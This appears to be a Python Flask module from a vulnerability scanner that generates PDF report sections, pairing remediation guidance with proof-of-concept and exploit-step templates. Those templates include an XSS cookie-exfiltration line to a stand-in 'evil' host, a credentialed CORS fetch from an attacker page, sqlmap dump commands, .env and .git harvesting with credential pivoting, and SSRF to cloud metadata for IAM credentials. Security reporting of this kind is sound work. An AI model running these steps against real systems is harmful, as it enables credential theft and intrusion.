"""PDF report generation: remediation guidance and PoC sections."""
import json
import time
import re
import os
import shutil
from datetime import datetime
from flask import Blueprint, jsonify, Response
from scanner.state import scan_state, LOCK
from core.utils import req_lib, REQUESTS_AVAILABLE, _safe_str, _safe_int
from core.logger import log
from core.auth import login_required

try:
    from fpdf import FPDF
    FPDF_AVAILABLE = True
except ImportError:
    FPDF_AVAILABLE = False
    FPDF = None

try:
    import sqlite3 as sqlite3_mod
    SQLITE_AVAILABLE = True
except ImportError:
    SQLITE_AVAILABLE = False
    sqlite3_mod = None

DB_PATH = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'infosec.db')

pdf_bp = Blueprint('pdf', __name__)

REMEDIATION_TIPS = {
    'critical': 'Immediate remediation required. Patch within 24 hours. Isolate affected asset if exploitation is active.',
    'high': 'Remediate within 1 week. Verify exploitability in your environment and apply available patches.',
    'medium': 'Schedule remediation within 30 days. Apply defense-in-depth controls as interim mitigation.',
    'low': 'Address in next maintenance window. Low exploitation risk but contributes to overall attack surface.',
    'info': 'Informational — no direct exploitation risk. Review and document.',
}

SECURITY_HEADER_REMEDIATIONS = {
    'Strict-Transport-Security': 'Add "Strict-Transport-Security: max-age=63072000; includeSubDomains; preload" to all HTTPS responses.',
    'Content-Security-Policy': 'Add "Content-Security-Policy: default-src \'self\'; script-src \'self\'; style-src \'self\'" to prevent XSS.',
    'X-Frame-Options': 'Add "X-Frame-Options: DENY" to prevent clickjacking attacks.',
    'X-Content-Type-Options': 'Add "X-Content-Type-Options: nosniff" to prevent MIME-type sniffing.',
    'Referrer-Policy': 'Add "Referrer-Policy: strict-origin-when-cross-origin" to control referrer leakage.',
    'Permissions-Policy': 'Add "Permissions-Policy: geolocation=(), microphone=(), camera=()" to restrict API access.',
}


def _find_tool(name):
    """Check if an external tool is available on PATH."""
    path = shutil.which(name)
    if path:
        return path
    go_bin = os.path.expanduser(f'~/go/bin/{name}')
    if os.path.isfile(go_bin) and os.access(go_bin, os.X_OK):
        return go_bin
    return None


def finding_remediation(f):
    sev = f.get('sev', 'info')
    tip = REMEDIATION_TIPS.get(sev, 'Review and remediate based on severity.')
    parts = [tip]
    title = (f.get('title', '') + ' ' + f.get('sub', '')).lower()
    owasp = f.get('owasp', '')

    if 'sqli' in title or 'sql injection' in title:
        parts.append('Step 1: Replace all string concatenation in SQL queries with parameterized queries.')
        parts.append('Step 2: Use prepared statements: cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))')
        parts.append('Step 3: Implement input validation: reject non-numeric input for ID fields.')
        parts.append('Step 4: Apply least-privilege: database user should only have SELECT on required tables.')
        parts.append('Step 5: Enable generic error pages: never expose SQL errors to users.')
        parts.append('Step 6: Deploy WAF rule: SecRule ARGS "@detectSQLi" "id:1001,phase:2,deny,status:403"')
        parts.append('Step 7: Monitor for SQLi patterns in logs: UNION, SLEEP, BENCHMARK, OR 1=1')
    elif 'xss' in title or 'cross-site' in title or 'cross site' in title:
        parts.append('Step 1: Identify all output contexts where user-controlled data is rendered (HTML body, attributes, JS, CSS, URL).')
        parts.append('Step 2: Apply context-aware output encoding: HTML entity encoding for body, JS unicode for scripts, URL encoding for hrefs.')
        parts.append('Step 3: Implement Content-Security-Policy: default-src \'self\'; script-src \'self\' \'nonce-{random}\'; object-src \'none\'')
        parts.append('Step 4: Use DOMPurify library for sanitizing HTML input: DOMPurify.sanitize(dirty, {ALLOWED_TAGS: [\'b\',\'i\',\'em\',\'strong\']})')
        parts.append('Step 5: Set HttpOnly flag on session cookies to prevent JavaScript-based cookie theft.')
        parts.append("Step 6: Implement input validation: reject or encode <, >, \", ', &, / in user input before storage.")
        parts.append('Step 7: Deploy WAF rules: SecRule ARGS "@detectXSS" "id:2001,phase:2,deny,status:403,msg:XSS Attempt"')
    elif 'cmdi' in title or 'command injection' in title:
        parts.append('Step 1: Audit all uses of os.system(), subprocess.Popen(), exec(), eval(), popen() with shell=True.')
        parts.append('Step 2: Replace shell commands with language-native APIs (e.g., socket.getaddrinfo() instead of nslookup).')
        parts.append('Step 3: If shell execution required, use subprocess.run(shell=False) with explicit argument list.')
        parts.append('Step 4: Implement strict input validation: allowlist of alphanumeric characters and limited special chars.')
        parts.append('Step 5: Use shlex.quote() (Python) or escapeshellarg() (PHP) to escape user input before shell execution.')
        parts.append('Step 6: Run application processes with minimal OS privileges (non-root, restricted filesystem access).')
        parts.append('Step 7: Deploy WAF rules: SecRule ARGS "@detectOSCmdInjection" "id:3001,phase:2,deny,status:403"')
    elif 'ssrf' in title or 'server-side request' in title:
        parts.append('Step 1: Identify all server-side HTTP request initiation points (URL fetchers, webhooks, PDF generators, image importers).')
        parts.append('Step 2: Implement URL validation with strict allowlist of permitted domains and IP ranges.')
        parts.append('Step 3: Block requests to internal IP ranges: 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, ::1/128.')
        parts.append('Step 4: Disable HTTP redirects in URL fetcher or validate redirect targets against allowlist.')
        parts.append('Step 5: Use network-level controls: firewall rules blocking outbound traffic from application servers to internal networks.')
        parts.append('Step 6: Implement DNS rebinding protection: resolve DNS once and pin the IP for the duration of the request.')
        parts.append('Step 7: Disable unused URL schemes: file://, gopher://, dict://, ftp://.')
    elif 'ssl' in title or 'cert' in title or 'tls' in title:
        parts.append('Step 1: Check current certificate expiry: openssl s_client -connect host:443 | openssl x509 -noout -dates')
        parts.append('Step 2: Renew SSL/TLS certificate from a trusted Certificate Authority (Let\'s Encrypt, DigiCert, etc.).')
        parts.append('Step 3: Configure server to use TLS 1.2 minimum, prefer TLS 1.3. Disable SSLv3, TLS 1.0, TLS 1.1.')
        parts.append('Step 4: Disable weak cipher suites: RC4, DES, 3DES, NULL, EXPORT, MD5-based. Use Mozilla SSL Configuration Generator.')
        parts.append('Step 5: Enable HSTS: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload')
        parts.append('Step 6: Enable OCSP stapling for improved certificate validation performance.')
        parts.append('Step 7: Submit domain to HSTS preload list: https://hstspreload.org/')
    elif 'cors' in title:
        parts.append('Step 1: Review current CORS policy and identify all Access-Control-Allow-Origin values.')
        parts.append('Step 2: Replace wildcard (*) ACAO with specific trusted domains: Access-Control-Allow-Origin: https://yourdomain.com')
        parts.append('Step 3: Never combine Access-Control-Allow-Credentials: true with wildcard or null ACAO origin.')
        parts.append('Step 4: Implement proper preflight (OPTIONS) handling with Access-Control-Max-Age to reduce preflight requests.')
        parts.append('Step 5: Restrict Access-Control-Allow-Methods to only required HTTP methods (GET, POST).')
        parts.append('Step 6: Restrict Access-Control-Allow-Headers to only required headers.')
        parts.append('Step 7: Regularly audit CORS configuration as part of security reviews.')
    elif 'idor' in title or 'direct object' in title:
        parts.append('Step 1: Implement indirect object references using UUIDs instead of sequential database IDs in URLs.')
        parts.append('Step 2: Add server-side authorization checks before every object access: verify the requesting user owns the resource.')
        parts.append('Step 3: Use session-based object mapping: store object references server-side, pass opaque tokens to client.')
        parts.append('Step 4: Implement rate limiting on object enumeration attempts (e.g., 10 requests/minute per user).')
        parts.append('Step 5: Log all unauthorized access attempts for security monitoring and incident response.')
        parts.append('Step 6: Conduct regular access control testing using different user accounts and privilege levels.')
    elif 'open redirect' in title:
        parts.append('Step 1: Identify all redirect functionality in the application (login return, logout, external links).')
        parts.append('Step 2: Implement strict allowlist of permitted redirect destinations (domains and path prefixes).')
        parts.append('Step 3: Validate redirect URLs against the allowlist before issuing 301/302 responses.')
        parts.append('Step 4: Use relative URLs for internal redirects: /dashboard instead of https://site.com/dashboard')
        parts.append('Step 5: Reject redirect parameters containing protocol-relative URLs (//evil.com) and data: URIs.')
        parts.append('Step 6: Consider using a redirect mapping table instead of accepting arbitrary URLs.')
    elif 'ssti' in title or 'template' in title:
        parts.append('Step 1: Identify all template engines in use and their version (Jinja2, Twig, Freemarker, ERB, Velocity).')
        parts.append('Step 2: Never render user input directly in template expressions. Pass user data as template variables only.')
        parts.append('Step 3: Enable sandbox mode for the template engine if available (Jinja2 SandboxEnvironment).')
        parts.append('Step 4: Implement input validation: reject template syntax characters ({ }, ${ }, <%, %>) in user input.')
        parts.append('Step 5: Use logic-less template engines (Mustache, Handlebars) where full template functionality is not required.')
        parts.append('Step 6: Apply the principle of least privilege to template context: do not expose dangerous objects (config, request, os).')
    elif 'path' in title or 'traversal' in title or 'lfi' in title:
        parts.append('Step 1: Identify all file inclusion/download functionality in the application.')
        parts.append('Step 2: Use a whitelist of permitted files instead of accepting arbitrary file paths from user input.')
        parts.append('Step 3: Validate that the resolved file path is within the expected directory using os.path.realpath().')
        parts.append('Step 4: Strip or reject directory traversal sequences (../, ..\\, %2e%2e%2f) from user input.')
        parts.append('Step 5: Use chroot or containerization to restrict filesystem access scope.')
        parts.append('Step 6: Disable PHP wrappers (php://filter, data://) if not required by application logic.')
    elif 'nosql' in title:
        parts.append('Step 1: Sanitize all user input before passing to NoSQL database queries.')
        parts.append('Step 2: Reject or strip NoSQL operator characters ($, {, }) from user input used in queries.')
        parts.append('Step 3: Use parameterized queries or ODM (Mongoose, MongoEngine) with strict schema validation.')
        parts.append('Step 4: Disable $where operator and server-side JavaScript execution in MongoDB if not required.')
        parts.append('Step 5: Implement input type validation: ensure strings are strings, integers are integers before query construction.')
        parts.append('Step 6: Apply least-privilege database user permissions (read-only where possible).')
    elif 'takeover' in title or 'subdomain' in title:
        parts.append('Step 1: Audit all DNS records for dangling CNAME entries pointing to deprovisioned services.')
        parts.append('Step 2: Remove or update CNAME records that point to services no longer under your control.')
        parts.append('Step 3: Implement automated monitoring for subdomain takeover indicators (NXDOMAIN on CNAME targets).')
        parts.append('Step 4: Claim unused subdomains on cloud providers (GitHub Pages, S3, Heroku, Azure) to prevent hijacking.')
        parts.append('Step 5: Regularly scan DNS records using tools like subjack, Can-I-Take-Over-XYZ.')
    elif 'cloud' in title or 'bucket' in title or 's3' in title:
        parts.append('Step 1: Review current S3/cloud storage bucket policies and ACLs for public access.')
        parts.append('Step 2: Enable S3 Block Public Access at the account level to prevent future misconfigurations.')
        parts.append('Step 3: Enable server-side encryption (SSE-S3 or SSE-KMS) on all buckets.')
        parts.append('Step 4: Enable versioning and MFA delete protection to prevent data loss.')
        parts.append('Step 5: Configure bucket logging and CloudTrail monitoring for access auditing.')
        parts.append('Step 6: Implement bucket policies that restrict access to specific IAM roles or VPC endpoints.')
    elif 'supply chain' in title or 'dependency' in title or 'library' in title:
        parts.append('Step 1: Generate Software Bill of Materials (SBOM) using syft, CycloneDX, or SPDX tools.')
        parts.append('Step 2: Identify vulnerable dependencies using: npm audit, pip-audit, Snyk, Dependabot, Trivy.')
        parts.append('Step 3: Update vulnerable packages to latest patched versions. If no patch available, evaluate alternatives.')
        parts.append('Step 4: Implement dependency scanning in CI/CD pipeline (GitHub Actions, GitLab CI).')
        parts.append('Step 5: Pin dependency versions and use lockfiles (package-lock.json, Pipfile.lock).')
        parts.append('Step 6: Enable Dependabot or Renovate for automated vulnerability alerts and PRs.')
    elif 'header' in title or 'missing' in title:
        for hdr, fix in SECURITY_HEADER_REMEDIATIONS.items():
            if hdr.lower().replace('-', ' ') in title:
                parts.append(f'Step 1: {fix}')
                parts.append(f'Step 2: Add the header to web server configuration (nginx: add_header, Apache: Header set).')
                parts.append(f'Step 3: Verify the header is present on all endpoints including error pages.')
                break
        else:
            parts.append('Step 1: Review HTTP response headers for missing security headers using curl -I or securityheaders.com.')
            parts.append('Step 2: Add all recommended security headers to server configuration.')
            parts.append('Step 3: Implement CSP with strict directives: default-src \'self\'; script-src \'self\'')
            parts.append('Step 4: Enable HSTS with max-age=31536000; includeSubDomains; preload')
            parts.append('Step 5: Set X-Frame-Options: DENY and X-Content-Type-Options: nosniff')
            parts.append('Step 6: Test headers using securityheaders.com and report-uri.com/csp-violation')
    elif 'auth' in title or 'login' in title or 'credential' in title:
        parts.append('Step 1: Implement multi-factor authentication (TOTP, WebAuthn, or SMS as fallback) for all user accounts.')
        parts.append('Step 2: Enforce strong password policies: minimum 12 characters, check against breached password databases (HaveIBeenPwned).')
        parts.append('Step 3: Implement progressive account lockout: 5 failed attempts -> 15 min lockout, 10 attempts -> 1 hour.')
        parts.append('Step 4: Use bcrypt (cost factor 12+) or argon2id for password hashing. Never use MD5, SHA1, or plain text.')
        parts.append('Step 5: Implement secure session management: HttpOnly, Secure, SameSite=Lax cookies, 30 min idle timeout.')
        parts.append('Step 6: Rate-limit authentication endpoints: max 10 login attempts per IP per minute.')
        parts.append('Step 7: Implement generic error messages: "Invalid username or password" (do not reveal which is wrong).')
    elif 'session' in title or 'cookie' in title or 'token' in title:
        parts.append('Step 1: Set Secure, HttpOnly, and SameSite=Lax/Strict flags on all session cookies.')
        parts.append('Step 2: Implement session timeout: 30 min idle timeout, 8 hour absolute timeout.')
        parts.append('Step 3: Regenerate session ID after successful authentication (prevent session fixation).')
        parts.append('Step 4: Use cryptographically random session tokens (minimum 128 bits of entropy).')
        parts.append('Step 5: Invalidate sessions server-side on logout (do not rely on client-side deletion only).')
        parts.append('Step 6: Implement concurrent session limits per user account.')
    elif 'upload' in title or 'file' in title:
        parts.append('Step 1: Validate file types using content inspection (magic bytes), not just file extension.')
        parts.append('Step 2: Store uploaded files outside the web root directory with randomized filenames.')
        parts.append('Step 3: Implement file size limits (e.g., 10MB) and scan uploads for malware (ClamAV).')
        parts.append('Step 4: Set Content-Disposition: attachment on file downloads to prevent inline execution.')
        parts.append('Step 5: Strip metadata (EXIF, IPTC) from uploaded images to prevent information disclosure.')
        parts.append('Step 6: Serve uploaded files from a separate domain or CDN to prevent same-origin attacks.')
    elif 'api' in title or 'endpoint' in title or 'rest' in title:
        parts.append('Step 1: Implement API authentication using OAuth 2.0, API keys, or JWT with proper validation.')
        parts.append('Step 2: Apply rate limiting per API key/IP: 100 requests/minute for read, 20/minute for write.')
        parts.append('Step 3: Validate and sanitize all API input parameters using JSON Schema or input validation libraries.')
        parts.append('Step 4: Implement proper error handling: return generic error codes without stack traces or internal details.')
        parts.append('Step 5: Use API versioning (v1, v2) and deprecation policies.')
        parts.append('Step 6: Implement request/response logging for security auditing.')
    elif 'open redirect' in title:
        parts.append('Step 1: Identify all redirect functionality in the application (login return, logout, external links).')
        parts.append('Step 2: Implement allowlist of permitted redirect destinations.')
        parts.append('Step 3: Validate redirect URLs against the allowlist before issuing 301/302 responses.')
        parts.append('Step 4: Use relative URLs for internal redirects where possible.')
    elif 'info' in title or 'disclosure' in title or 'exposure' in title or 'leak' in title:
        parts.append('Step 1: Remove sensitive information from HTTP responses (server versions, stack traces, internal IPs).')
        parts.append('Step 2: Disable verbose error messages in production: configure custom error pages.')
        parts.append('Step 3: Remove server version headers: ServerTokens Prod (Apache), server_tokens off (nginx).')
        parts.append('Step 4: Review robots.txt, sitemap.xml, and .well-known/ for sensitive path disclosure.')
        parts.append('Step 5: Disable directory listing on all web-accessible directories.')
        parts.append('Step 6: Remove debug endpoints, admin panels, and development tools from production.')
    elif 'bot' in title or 'captcha' in title:
        parts.append('Step 1: Implement CAPTCHA (reCAPTCHA v3, hCaptcha) on authentication and sensitive form endpoints.')
        parts.append('Step 2: Deploy bot detection using User-Agent analysis, behavioral fingerprinting, and JavaScript challenges.')
        parts.append('Step 3: Implement rate limiting: 10 requests/second per IP for unauthenticated endpoints.')
        parts.append('Step 4: Use Cloudflare Bot Management or AWS WAF Bot Control for advanced bot protection.')
        parts.append('Step 5: Monitor for credential stuffing patterns (high login failure rate from distributed IPs).')
    elif 'ddos' in title or 'rate limit' in title:
        parts.append('Step 1: Deploy CDN-based DDoS protection (Cloudflare, AWS Shield, Akamai).')
        parts.append('Step 2: Implement application-level rate limiting per IP and per user.')
        parts.append('Step 3: Configure auto-scaling to handle traffic spikes.')
        parts.append('Step 4: Implement connection limits and request timeouts at the load balancer level.')
        parts.append('Step 5: Enable SYN cookies and connection rate limiting at the network level.')
    elif 'firewall' in title or 'waf' in title:
        parts.append('Step 1: Deploy a Web Application Firewall (WAF) in front of the application.')
        parts.append('Step 2: Enable OWASP Core Rule Set (CRS) for ModSecurity or equivalent WAF ruleset.')
        parts.append('Step 3: Configure WAF to block (not just log) critical attack patterns (SQLi, XSS, RCE).')
        parts.append('Step 4: Implement virtual patching for known vulnerabilities pending code fixes.')
        parts.append('Step 5: Monitor WAF logs for attack patterns and tune rules to reduce false positives.')
    else:
        parts.append('Step 1: Review the vulnerability details and assess the risk to your environment.')
        parts.append('Step 2: Consult OWASP Testing Guide and vendor documentation for specific remediation guidance.')
        parts.append('Step 3: Implement defense-in-depth controls (WAF, input validation, output encoding) as interim mitigation.')
        parts.append('Step 4: Test the fix in a staging environment before deploying to production.')
        parts.append('Step 5: Verify remediation by re-running the same test that identified the vulnerability.')
        parts.append('Step 6: Document the remediation actions taken for compliance audit trail.')
    return ' | '.join(parts)




def build_poc_section(f):
    """
    Build a proof-of-concept section for a single finding, using ONLY
    real, observed evidence from the scan. No fabricated test steps or
    made-up HTTP responses — those are unreliable and unethical.
    """
    cve = f.get('cve', '')
    poc = f.get('poc_link', '')
    exploit = f.get('exploit', '')
    title_full = (f.get('title', '') + ' ' + f.get('sub', ''))
    title = title_full.lower()
    sev = f.get('sev', 'info')
    asset = f.get('asset', '')
    cvss = f.get('cvss', '')
    details = f.get('details', '') or f.get('sub', '')
    owasp = f.get('owasp', '')
    mitre = f.get('mitre', '')
    parts = []

    asset_url = asset if asset.startswith(('http://', 'https://')) else (f'https://{asset}' if asset else '')

    # ═══════════════════════════════════════════════════════════════════════════
    # SECTION 1: VULNERABILITY SUMMARY
    # ═══════════════════════════════════════════════════════════════════════════
    parts.append('=== VULNERABILITY SUMMARY ===')
    parts.append(f'Title: {f.get("title", "Security Finding")}')
    parts.append(f'Severity: {sev.upper()} | CVSS: {cvss or "N/A"} | OWASP: {owasp or "N/A"} | MITRE: {mitre or "N/A"}')
    if cve:
        parts.append(f'CVE: {cve}')
    parts.append(f'Target: {asset_url}')
    parts.append(f'Description: {f.get("sub", details[:200] if details else "No description")}')
    parts.append('')

    # ═══════════════════════════════════════════════════════════════════════════
    # SECTION 2: ACTUAL EVIDENCE CAPTURED (per-tool)
    # ═══════════════════════════════════════════════════════════════════════════
    parts.append('=== ACTUAL EVIDENCE ===')
    parts.append('Real data captured during the automated scan. No fabricated steps.')
    parts.append('')

    # ── DALFOX XSS: show parameter, payload, PoC URL ──
    if 'dalfox' in details.lower() or ('xss' in title and 'dalfox' in details.lower()):
        parts.append('Tool: dalfox — Advanced XSS Scanner')
        parts.append(f'Target URL: {asset_url}')
        # Extract dalfox-specific data from details
        for line in details.splitlines():
            line = line.strip()
            if any(k in line.lower() for k in ['parameter:', 'type:', 'payload:', 'poc:', 'dom']):
                parts.append(f'  {line}')
        if poc:
            parts.append(f'  Proof-of-Concept URL: {poc}')
        parts.append('')
        parts.append('Verification Steps:')
        parts.append(f'  1. Open the PoC URL in a browser')
        parts.append(f'  2. Observe the XSS payload executing (alert, console.log, etc.)')
        parts.append(f'  3. Confirm the parameter reflects user input without encoding')
        parts.append('')

    # ── SQLMAP SQLi: show injection type, parameter, payload ──
    elif 'sqli' in title or 'sql injection' in title or 'sqlmap' in details.lower():
        parts.append('Tool: sqlmap — SQL Injection Scanner')
        parts.append(f'Target URL: {asset_url}')
        for line in details.splitlines():
            line = line.strip()
            if any(k in line.lower() for k in ['injection', 'parameter', 'type:', 'payload', 'database', 'dbms']):
                parts.append(f'  {line}')
        if poc:
            parts.append(f'  Exploit Command: {poc}')
        parts.append('')
        parts.append('Reproduction:')
        parts.append(f'  sqlmap -u "{asset_url}" --batch --level=3 --risk=2')
        parts.append(f'  sqlmap -u "{asset_url}" --dbs --batch  # enumerate databases')
        parts.append(f'  sqlmap -u "{asset_url}" -D <db> --tables --batch  # dump tables')
        parts.append('')

    # ── NUCLEI: show template ID, severity, matched at ──
    elif 'nuclei' in details.lower() or 'template' in details.lower():
        parts.append('Tool: nuclei — Template-based Vulnerability Scanner')
        parts.append(f'Target: {asset_url}')
        for line in details.splitlines():
            line = line.strip()
            if any(k in line.lower() for k in ['template', 'matched', 'severity', 'description', 'reference']):
                parts.append(f'  {line}')
        parts.append('')
        parts.append('Manual Verification:')
        parts.append(f'  nuclei -u {asset_url} -t <template-id> -severity {sev}')
        parts.append('')

    # ── GITLEAKS/TRUFFLEHOG SECRETS: show rule, file, line ──
    elif 'leaked secret' in title or 'deep secret' in title or 'gitleaks' in details.lower() or 'trufflehog' in details.lower():
        parts.append('Tool: gitleaks / trufflehog — Secrets Scanner')
        parts.append(f'Asset: {asset_url}')
        for line in details.splitlines():
            line = line.strip()
            if any(k in line.lower() for k in ['rule:', 'file:', 'line:', 'detector:', 'entropy:', 'verified:']):
                parts.append(f'  {line}')
        parts.append('')
        parts.append('Verification:')
        parts.append(f'  1. Check if the secret is still valid (rotate immediately if yes)')
        parts.append(f'  2. Search git history: git log --all -p | grep -C3 "<secret-prefix>"')
        parts.append(f'  3. Rotate the credential and remove from source code')
        parts.append('')

    # ── SEMGREP SAST: show rule, file, line, CWE ──
    elif 'sast:' in title.lower() or 'semgrep' in details.lower():
        parts.append('Tool: semgrep — Static Application Security Testing')
        parts.append(f'Source File: {asset_url}')
        for line in details.splitlines():
            line = line.strip()
            if any(k in line.lower() for k in ['rule:', 'file:', 'lines:', 'cwe:', 'confidence:', 'message:']):
                parts.append(f'  {line}')
        parts.append('')
        parts.append('Code Review:')
        parts.append(f'  1. Open the affected file and navigate to the flagged line')
        parts.append(f'  2. Review the code pattern that triggered the rule')
        parts.append(f'  3. Apply the recommended fix (input validation, parameterized queries, etc.)')
        parts.append('')

    # ── CRLF INJECTION: show URL, header, payload ──
    elif 'crlf' in title:
        parts.append('Tool: crlfuzz — CRLF Injection Scanner')
        parts.append(f'Target URL: {asset_url}')
        for line in details.splitlines():
            line = line.strip()
            if line:
                parts.append(f'  {line}')
        parts.append('')
        parts.append('Reproduction:')
        parts.append(f'  curl -v "{asset_url}/?test=%0d%0aInjected-Header:%20malicious"')
        parts.append(f'  Observe: Injected-Header appears in the HTTP response headers')
        parts.append('')

    # ── OSV DEPENDENCY: show package, version, CVE ──
    elif 'vulnerable dependency' in title:
        parts.append('Tool: osv-scanner — Dependency Vulnerability Scanner')
        for line in details.splitlines():
            line = line.strip()
            if any(k in line.lower() for k in ['package:', 'version:', 'vulnerability:', 'source:']):
                parts.append(f'  {line}')
        parts.append('')
        parts.append('Verification:')
        parts.append(f'  osv-scanner --lockfile=<path-to-lockfile>')
        parts.append(f'  Check: https://osv.dev/vulnerability/{cve} for details')
        parts.append('')

    # ── NMAP PORT: show port, service, version ──
    elif ('port' in title or 'open' in title) and ('tcp' in title or 'service' in title):
        parts.append('Tool: nmap — Network Scanner')
        parts.append(f'Target: {asset}')
        for line in details.splitlines():
            line = line.strip()
            if any(k in line.lower() for k in ['port:', 'service:', 'version:', 'state:', 'banner']):
                parts.append(f'  {line}')
        parts.append('')
        parts.append('Verification:')
        parts.append(f'  nmap -sV -sC {asset}  # service version detection')
        parts.append(f'  nmap --script=vuln {asset}  # vulnerability scan')
        parts.append('')

    # ── SSL/TLS: show protocol, cipher, issue ──
    elif 'ssl' in title or 'tls' in title:
        parts.append('Tool: testssl.sh / sslyze — SSL/TLS Analyzer')
        parts.append(f'Target: {asset_url}')
        for line in details.splitlines():
            line = line.strip()
            if any(k in line.lower() for k in ['protocol', 'cipher', 'certificate', 'grade', 'issue', 'vulnerability']):
                parts.append(f'  {line}')
        parts.append('')
        parts.append('Verification:')
        parts.append(f'  testssl.sh {asset_url}')
        parts.append(f'  sslyze --regular {asset}')
        parts.append('')

    # ── CORS: show Origin reflection ──
    elif 'cors' in title:
        parts.append('Tool: Custom CORS Module')
        parts.append(f'Target: {asset_url}')
        for line in details.splitlines():
            line = line.strip()
            if any(k in line.lower() for k in ['origin:', 'header:', 'reflect', 'credential']):
                parts.append(f'  {line}')
        parts.append('')
        parts.append('Reproduction:')
        parts.append(f'  curl -H "Origin: https://evil.example" -I {asset_url}')
        parts.append(f'  Observe: Access-Control-Allow-Origin: https://evil.example')
        parts.append(f'  Observe: Access-Control-Allow-Credentials: true')
        parts.append('')

    # ── HEADER MISSING: show which header is missing ──
    elif 'header' in title or 'missing' in title:
        parts.append('Tool: HTTP Header Analyzer')
        parts.append(f'Target: {asset_url}')
        for line in details.splitlines():
            line = line.strip()
            if line and len(line) > 3:
                parts.append(f'  {line}')
        parts.append('')
        parts.append('Current Headers (sample):')
        parts.append(f'  curl -I {asset_url}')
        parts.append('')

    # ── WAF DETECTION: show WAF type ──
    elif 'waf' in title.lower():
        parts.append('Tool: wafw00f — WAF Fingerprinting')
        parts.append(f'Target: {asset_url}')
        for line in details.splitlines():
            line = line.strip()
            if line and len(line) > 3:
                parts.append(f'  {line}')
        parts.append('')

    # ── SUBDOMAIN / TAKEOVER ──
    elif 'takeover' in title or 'subdomain' in title:
        parts.append('Tool: subfinder / amass — Subdomain Enumeration')
        for line in details.splitlines():
            line = line.strip()
            if line and len(line) > 3:
                parts.append(f'  {line}')
        parts.append('')
        parts.append('Verification:')
        parts.append(f'  dig {asset} ANY')
        parts.append(f'  httpx -u {asset} -sc -title -tech-detect')
        parts.append('')

    # ── OPEN REDIRECT ──
    elif 'open redirect' in title:
        parts.append('Tool: Custom Open Redirect Module')
        parts.append(f'Target URL: {asset_url}')
        for line in details.splitlines():
            line = line.strip()
            if line and len(line) > 3:
                parts.append(f'  {line}')
        parts.append('')
        parts.append('Reproduction:')
        parts.append(f'  1. Open: {asset_url}')
        parts.append(f'  2. Observe redirect to external domain')
        parts.append(f'  3. Verify with: curl -v -L "{asset_url}" | grep -i "location:"')
        parts.append('')

    # ── SSRF ──
    elif 'ssrf' in title or 'server-side request' in title:
        parts.append('Tool: Custom SSRF Module')
        parts.append(f'Target URL: {asset_url}')
        for line in details.splitlines():
            line = line.strip()
            if any(k in line.lower() for k in ['parameter:', 'internal', 'metadata', 'payload', 'response']):
                parts.append(f'  {line}')
        parts.append('')
        parts.append('Reproduction:')
        parts.append(f'  1. Identify the URL-fetching parameter')
        parts.append(f'  2. Inject: http://169.254.169.254/latest/meta-data/')
        parts.append(f'  3. If IMDSv1 enabled, retrieve IAM credentials')
        parts.append('')

    # ── GENERIC FALLBACK ──
    else:
        parts.append(f'Target: {asset_url}')
        for line in details.splitlines():
            line = line.strip()
            if line and len(line) > 3:
                parts.append(f'  {line}')
        parts.append('')
        parts.append('Manual Verification:')
        parts.append(f'  1. Access {asset_url} in a browser')
        parts.append(f'  2. Follow the evidence captured above')
        parts.append(f'  3. Confirm the vulnerability exists before remediation')

    parts.append('')

    # ═══════════════════════════════════════════════════════════════════════════
    # SECTION 3: EXPLOIT STEPS
    # ═══════════════════════════════════════════════════════════════════════════
    parts.append('=== EXPLOIT STEPS ===')
    if 'environment file' in title or '.env' in title or 'env file' in title:
        parts.append(f'1. Request the exposed .env file:')
        parts.append(f'   curl -s {asset_url}')
        parts.append(f'2. Parse response for KEY=VALUE pairs — every value is a credential')
        parts.append(f'3. Test each credential against live services (DB, Redis, SMTP, APIs)')
        parts.append(f'4. Pivot: use cloud keys to enumerate resources, DB creds to dump data')
        parts.append(f'5. Rotate ALL exposed variables. Block .env at the web server.')
    elif 'git repository' in title or '.git' in title:
        parts.append(f'1. Download the exposed .git directory:')
        parts.append(f'   wget -r -np {asset_url}/.git/')
        parts.append(f'2. Reconstruct the repository:')
        parts.append(f'   git clone {asset_url}/.git/ leaked-repo')
        parts.append(f'3. Search for hardcoded credentials: grep -rn "password\\\\|api_key\\\\|secret" .')
        parts.append(f'4. Use leaked source to find additional vulnerabilities')
    elif 'sqli' in title or 'sql injection' in title:
        parts.append(f'1. Identify the vulnerable parameter on {asset_url}')
        parts.append(f'2. Test with single quote: {asset_url}/?id=1%27')
        parts.append(f'3. If DB error appears → error-based SQLi confirmed')
        parts.append(f'4. Use sqlmap for full exploitation:')
        parts.append(f'   sqlmap -u "{asset_url}/?id=1" --dbs --batch')
        parts.append(f'5. Dump sensitive tables, extract credentials')
    elif 'xss' in title or 'cross-site' in title:
        parts.append(f'1. Identify the reflected parameter')
        parts.append(f'2. Inject XSS payload:')
        parts.append(f'   {asset_url}/?q=<script>alert(document.domain)</script>')
        parts.append(f'3. If stored XSS, inject into profile/comments field')
        parts.append(f'4. Victim visiting the page triggers script execution')
        parts.append(f'5. Exfiltrate session: document.location="https://evil/?c="+document.cookie')
    elif 'cors' in title:
        parts.append(f'1. Create malicious page at https://evil.example/')
        parts.append(f'2. Add script: fetch("{asset_url}", {{credentials:"include"}})')
        parts.append(f'3. Exfiltrate response to attacker-controlled server')
        parts.append(f'4. Victim visits the malicious page → credentials leaked')
    elif 'crlf' in title:
        parts.append(f'1. Inject CRLF sequence into URL parameter:')
        parts.append(f'   {asset_url}/?test=%0d%0aInjected-Header:%20value')
        parts.append(f'2. Observe injected header in HTTP response')
        parts.append(f'3. Chain with cache poisoning or XSS for full exploitation')
    elif 'port' in title or 'open' in title:
        parts.append(f'1. Port is open and reachable from the internet')
        parts.append(f'2. Banner-grab the service: nmap -sV -p {asset}')
        parts.append(f'3. Look up CVEs for detected version')
        parts.append(f'4. Attempt default credentials if applicable')
    elif 'secret' in title:
        parts.append(f'1. Secret is exposed at: {asset_url}')
        parts.append(f'2. Verify if the secret is still valid')
        parts.append(f'3. If valid: rotate immediately and audit access logs')
        parts.append(f'4. Remove from source code and git history')
    else:
        parts.append(f'1. Access {asset_url} and reproduce the vulnerability')
        parts.append(f'2. Follow the evidence captured in the scan results')
        parts.append(f'3. Validate exploitation path before remediation')
    parts.append('')

    # ═══════════════════════════════════════════════════════════════════════════
    # SECTION 4: IMPACT ANALYSIS
    # ═══════════════════════════════════════════════════════════════════════════
